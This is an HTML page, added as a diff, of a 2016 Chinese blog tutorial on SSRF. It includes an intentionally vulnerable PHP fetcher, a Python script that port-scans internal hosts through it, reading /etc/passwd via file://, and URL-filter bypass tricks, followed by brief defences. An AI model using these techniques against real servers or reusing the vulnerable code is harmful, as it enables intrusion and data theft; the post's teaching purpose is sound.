@@ -1,0 +1,635 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="SSRF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="概述Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。
+危害为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序
+123456789101112131415161718">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Server-side request forgery">
+<meta property="og:url" content="http://yoursite.com/2016/05/30/Server-side-request-forgery/index.html">
+<meta property="og:site_name" content="Wismartzy's Blog">
+<meta property="og:description" content="概述Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。
+危害为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序
+123456789101112131415161718">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-1.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-2.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-3.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-4.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-5.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-6.png">
+<meta property="og:image" content="http://yoursite.com/images/ssrf-7.png">
+<meta property="og:updated_time" content="2016-05-30T15:42:39.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Server-side request forgery">
+<meta name="twitter:description" content="概述Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。
+危害为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序
+123456789101112131415161718">
+<meta name="twitter:image" content="http://yoursite.com/images/ssrf-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+  <title> Server-side request forgery | Wismartzy's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Wismartzy's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Server-side request forgery
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-05-30T22:14:56+08:00" content="2016-05-30">
+              2016-05-30
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/05/30/Server-side-request-forgery/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/30/Server-side-request-forgery/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Server-Side Request Forgery即我们平常所说的SSRF攻击，翻译过来也就是服务器端请求伪造。漏洞的本质就是攻击者通过应用的正常功能（分享、转码、翻译、图片加载/下载、图片/文章收藏等）使服务器作为代理来访问到原本无法访问到的内网资源。</p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>为了更清楚的认识到SSRF可以干什么，我写了个存在SSRF漏洞的PHP小程序</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// getContent.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">	$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">	$curl = curl_init();</span><br><span class="line">	curl_setopt($curl, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">	curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">	curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$result = curl_exec($curl);</span><br><span class="line">	curl_close($curl);</span><br><span class="line"></span><br><span class="line">	$filename = <span class="string">'user'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">	file_put_contents($filename, $result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="代理访问"><a href="#代理访问" class="headerlink" title="代理访问"></a>代理访问</h2><p>该漏洞的本质就是可以利用存在漏洞服务器作为跳板去访问服务器所在内网的资源，于是可以用这作为判断是否存在SSRF漏洞的第一步，为什么说是第一步呢，因为我们利用SSRF是要获取到内网的信息，可能服务器允许本身请求其他域名（比如此处的ssrftest域名），但是对内网地址全部黑名单了，利用该SSRF是探测不到内网信息的，那么这就不能算漏洞了，所以，接下来可以尝试访问一些通过前期收集的内网域名，记录下数据包返回内容、数据包返回延时等，最终判断是否存在该漏洞。</p>
+<p><img src="/images/ssrf-1.png" alt="代理访问"></p>
+<p>然后在cloudeye上收到了日志，ip是我本地的出口ip，而本地浏览器网络接口只发起了一次到服务器的请求，说明日志是服务器端发起访问ssrftest域名生成的。</p>
+<blockquote>
+<p>[29/May/2016:00:18:31 +0800] 123.122.x.x - - ssrftest.xxxxx.dnslog.info POST / HTTP/1.1 200 “-“ “-“</p>
+</blockquote>
+<h2 id="攻击内网web应用（指纹识别、漏洞攻击）"><a href="#攻击内网web应用（指纹识别、漏洞攻击）" class="headerlink" title="攻击内网web应用（指纹识别、漏洞攻击）"></a>攻击内网web应用（指纹识别、漏洞攻击）</h2><p>指纹识别其实就是访问一些已知系统（cms等）的特有文件/路径，来达到识别系统的效果。我在内网50机器上部署了一个web服务，如果该web服务存在使用get参数就能实现的漏洞（struts，sqli，xss…），那么就可以通过SSRF漏洞直接对web服务进行攻击。</p>
+<p><img src="/images/ssrf-2.png" alt="攻击内网web应用"></p>
+<h2 id="对服务器内网所在机器进行端口扫描"><a href="#对服务器内网所在机器进行端口扫描" class="headerlink" title="对服务器内网所在机器进行端口扫描"></a>对服务器内网所在机器进行端口扫描</h2><p>写了个py小程序，对目标机器的1-10000端口进行扫描</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssrf_port_scan.py</span></span><br><span class="line"><span class="comment"># require library: requests</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">vulSite = <span class="string">"http://localhost:8888/getContent.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(host)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Scan "</span> + host</span><br><span class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">		payload = &#123;</span><br><span class="line">			<span class="string">'url'</span>: host + <span class="string">":"</span> + str(port)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			res = requests.post(vulSite, data=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> res.text != <span class="string">""</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"[+] port open: "</span> + str(port)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">except</span> Exception, e:</span><br><span class="line">			<span class="keyword">print</span> str(e), <span class="string">"port--&gt;"</span> + str(port)</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host)</span>:</span></span><br><span class="line">	portScan(host)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment"># 若不指定扫描host，则默认扫服务器本机</span></span><br><span class="line">	host = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">"127.0.0.1"</span></span><br><span class="line">	main(host)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ssrf-3.png" alt="端口扫描"></p>
+<p>然后通过访问这些开放的端口，可以得到端口所部署的服务banner信息</p>
+<p><img src="/images/ssrf-4.png" alt="服务发现"></p>
+<h2 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h2><p>可以利用file协议去读取本地文件，这里我以读/etc/passwd为例</p>
+<p><img src="/images/ssrf-5.png" alt="本地文件读取"></p>
+<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><h2 id="利用URL特性"><a href="#利用URL特性" class="headerlink" title="利用URL特性"></a>利用URL特性</h2><p>一个完整的URL格式如下</p>
+<blockquote>
+<p>scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]</p>
+</blockquote>
+<p>为了避免某些启用了BASIC认证的web服务弹出登录对话框，可以使用如下方式去访问URL，即将BASIC认证所需信息拼接到URL地址中</p>
+<blockquote>
+<p><a href="https://username:password@www.example.com/index.html" target="_blank" rel="external">https://username:password@www.example.com/index.html</a></p>
+</blockquote>
+<p>也就是说浏览器是支持something@domain这样格式的URL的，利用这个特性可以绕过服务器端对URL的简单过滤，下图实际返回的内容正是ssrftest.xxx.dnslog.info的内容。</p>
+<p><img src="/images/ssrf-6.png" alt="URL特性"></p>
+<h2 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h2><p><a href="http://xip.io/" target="_blank" rel="external">xip.io</a>为任意ip地址提供了DNS泛解析</p>
+<pre><code>        10.0.0.1.xip.io   resolves to   10.0.0.1
+   www.10.0.0.1.xip.io   resolves to   10.0.0.1
+ mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
+foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1
+</code></pre><h2 id="ip地址进制转换"><a href="#ip地址进制转换" class="headerlink" title="ip地址进制转换"></a>ip地址进制转换</h2><p>比如127.0.0.1的8进制=017700000001</p>
+<p><img src="/images/ssrf-7.png" alt="IP地址进制转换"></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><blockquote>
+<p>如果业务不需要从内部拿资源，那么就黑名单内网ip吧</p>
+<p>限制请求协议仅为HTTP</p>
+<p>控制返回信息，若正常业务请求的文件类型是特定的，那么在返回给用户前先验证下，避免被用户利用。若有报错信息，请直接返回统一error样式。</p>
+</blockquote>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
+<p><a href="http://drops.wooyun.org/papers/146" target="_blank" rel="external">http://drops.wooyun.org/papers/146</a></p>
+<p><a href="https://sobug.com/article/detail/11" target="_blank" rel="external">https://sobug.com/article/detail/11</a></p>
+<p><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SSRF/" rel="tag">#SSRF</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/23/The-Security-of-HTTP-Headers/" rel="next" title="The Security of HTTP Headers">
+                <i class="fa fa-chevron-left"></i> The Security of HTTP Headers
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/05/30/Server-side-request-forgery/"
+           data-title="Server-side request forgery" data-url="http://yoursite.com/2016/05/30/Server-side-request-forgery/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Wismartzy" />
+          <p class="site-author-name" itemprop="name">Wismartzy</p>
+          <p class="site-description motion-element" itemprop="description">Worker Security</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#危害"><span class="nav-number">2.</span> <span class="nav-text">危害</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代理访问"><span class="nav-number">2.1.</span> <span class="nav-text">代理访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击内网web应用（指纹识别、漏洞攻击）"><span class="nav-number">2.2.</span> <span class="nav-text">攻击内网web应用（指纹识别、漏洞攻击）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对服务器内网所在机器进行端口扫描"><span class="nav-number">2.3.</span> <span class="nav-text">对服务器内网所在机器进行端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件读取"><span class="nav-number">2.4.</span> <span class="nav-text">本地文件读取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过技巧"><span class="nav-number">3.</span> <span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用URL特性"><span class="nav-number">3.1.</span> <span class="nav-text">利用URL特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xip-io"><span class="nav-number">3.2.</span> <span class="nav-text">xip.io</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ip地址进制转换"><span class="nav-number">3.3.</span> <span class="nav-text">ip地址进制转换</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wismartzy</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"wismartzy"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
